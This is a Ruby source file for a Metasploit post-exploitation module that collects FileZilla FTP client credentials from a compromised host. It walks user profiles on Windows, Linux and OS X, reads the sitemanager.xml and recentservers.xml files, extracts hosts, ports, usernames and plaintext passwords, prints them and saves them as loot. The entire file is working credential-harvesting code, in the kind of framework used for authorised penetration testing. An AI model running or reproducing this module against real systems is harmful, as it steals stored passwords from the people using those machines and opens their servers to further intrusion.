##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'rexml/document'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'FileZilla FTP Client Credential Collection',
			'Description'    => %q{ This module will collect credentials from the FileZilla FTP client if installed. },
			'License'        => MSF_LICENSE,
			'Author'         => 
				[
					'bannedit', # post port, added support for shell sessions
					'Carlos Perez <carlos_perez[at]darkoperator.com>' # original meterpreter script
				],
			'Version'        => '$Revision$',
			'Platform'       => ['unix', 'bsd', 'linux', 'osx', 'windows'],
			'SessionTypes'   => ['shell', 'meterpreter' ]
		))
	end

	def run
		case session.platform
		when /unix|linux|bsd/
			@platform = :unix
			paths = enum_users_unix
		when /osx/
			@platform = :osx
			paths = enum_users_unix
		when /win/
			@platform = :windows
			drive = session.fs.file.expand_path("%SystemDrive%")
			os = session.sys.config.sysinfo['OS']

			if os =~ /Windows 7|Vista|2008/
				@appdata = '\\AppData\\Roaming'
				@users = drive + '\\Users'
			else
				@appdata = '\\Application Data'
				@users = drive + '\\Documents and Settings'
			end

			if session.type != "meterpreter"
				print_error "Only meterpreter sessions are supported on windows hosts"
				return
			end
			paths = enum_users_windows
		else
			print_error "Unsupported platform #{session.platform}"
			return
		end
		if paths.empty?
			print_status("No users found with a FileZilla directory")
			return
		end

		get_filezilla_creds(paths)
	end

	def enum_users_unix
		if @platform == :osx
			home = "/Users/"
		else
			home = "/home/"
		end

		if got_root?
			userdirs = session.run_cmd("ls #{home}").gsub(/\s/, "\n")
			userdirs << "/root\n"
		else
			userdirs = session.run_cmd("ls #{home}#{whoami}/.filezilla")
			if userdirs =~ /No such file/i
				return 
			else
				print_status("Found FileZilla Client profile for: #{whoami}")
				return ["#{home}#{whoami}/.filezilla"] 
			end
		end

		paths = Array.new
		userdirs.each_line do |dir|
			dir.chomp!
			next if dir == "." || dir == ".."

			dir = "#{home}#{dir}" if dir !~ /root/
			print_status("Checking for FileZilla Client profile in: #{dir}")

			stat = session.run_cmd("ls #{dir}/.filezilla/sitemanager.xml")
			next if stat =~ /No such file/i
			paths << "#{dir}/.filezilla"
		end
		return paths
	end

	def enum_users_windows
		paths = []

		if got_root?
			session.fs.dir.foreach(@users) do |path|
				next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
				filezilladir = "#{@users}\\#{path}#{@appdata}\\"
				dir = check_filezilla(filezilladir)
				if dir
					paths << dir
				end
			end
		else
			print_status "We do not have SYSTEM checking #{whoami} account"
			# not root
			path = "#{@users}\\#{whoami}#{@appdata}"
			session.fs.dir.foreach(path) do |dir|
				if dir =~ /FileZilla/
					paths << "#{path}\\#{dir}"
				end
			end
		end
		return paths
	end

	def check_filezilla(filezilladir)
		print_status("Checking for Filezilla directory in: #{filezilladir}")
		session.fs.dir.foreach(filezilladir) do |dir|
			if dir =~ /FileZilla/
				print_status("Found #{filezilladir}#{dir}")
				return "#{filezilladir}#{dir}"
			end
		end
		return nil
	end

	def get_filezilla_creds(paths)

		sitedata = ""
		recentdata = ""
		creds = []
		credentials = Rex::Ui::Text::Table.new(
		'Header'    => "FileZilla Credentials",
		'Indent'    => 1,
		'Columns'   =>
		[
			"Host",
			"Port",
			"Login Type",
			"User",
			"Password"
		])

		paths.each do |path|
			print_status("Reading sitemanager.xml and recentservers.xml files from #{path}")
			if session.type == "shell"
				type = :shell
				sites = session.run_cmd("cat #{path}/sitemanager.xml")
				recents = session.run_cmd("cat #{path}/recentservers.xml")
				puts "recents: #{recents}"
				creds = [parse_accounts(sites)]
				creds << parse_accounts(recents) unless recents =~ /No such file/i
			else
				type = :meterp
				sites = session.fs.file.new("#{path}\\sitemanager.xml", "rb")
				until sites.eof?
					sitedata << sites.read
				end
				sites.close
				creds = [parse_accounts(sitedata)]

				recents = session.fs.file.new("#{path}\\recentservers.xml", "rb")
				until recents.eof?
					recentdata << recents.read
				end
				recents.close
				creds << parse_accounts(recentdata)
			end

			creds.each do |cred|
				cred.each do |loot|
					credentials << [loot['host'], loot['port'], loot['logontype'], loot['user'], loot['password']]
				end
			end
		end

		store_loot("filezilla.client.creds", "text/plain", session.tunnel_peer, credentials.to_s, "filezilla_client_credentials.txt", "FileZilla Client Credentials")
	end

	def parse_accounts(data)
		creds = []
		doc = REXML::Document.new(data).root
		
		doc.elements.to_a("//Server").each do |sub|
			account = {}
			account['host'] = sub.elements['Host'].text rescue "<unknown>"
			account['port'] = sub.elements['Port'].text rescue "<unknown>"

			case sub.elements['Logontype'].text
			when "0"
				account['logontype'] = "Anonymous"
			when /1|4/
				account['user'] = sub.elements['User'].text rescue "<unknown>"
				account['password'] = sub.elements['Pass'].text rescue "<unknown>"
				
			when /2|3/
				account['user'] = sub.elements['User'].text rescue "<unknown>"
				account['password'] = "<blank>"
			end

			if account['user'].nil?
				account['user'] = "<blank>"
			end
			if account['password'].nil?
				account['password'] = "<blank>"
			end
			
			case sub.elements['Protocol'].text 
			when "0"
				account['protocol'] = "FTP"
			when "1"
				account['protocol'] = "SSH"
			when "3"
				account['protocol'] = "FTPS"
			when "4"
				account['protocol'] = "FTPES"
			end
			creds << account

			print_status("    Collected the following credentials:")
			print_status("    Server: %s:%s" % [account['host'], account['port']])
			print_status("    Protocol: %s" % account['protocol'])
			print_status("    Username: %s" % account['user'])
			print_status("    Password: %s" % account['password'])
			print_line("")
		end
		return creds
	end

	def got_root?
		case @platform
		when :windows
			if session.sys.config.getuid =~ /SYSTEM/
				return true
			else
				return false
			end
		else # unix, bsd, linux, osx
			ret = whoami
			if ret =~ /root/
				return true
			else
				return false
			end
		end
	end

	def whoami
		if @platform == :windows
			session.fs.file.expand_path("%USERNAME%")
		else
			session.run_cmd("whoami").chomp
		end
	end
end
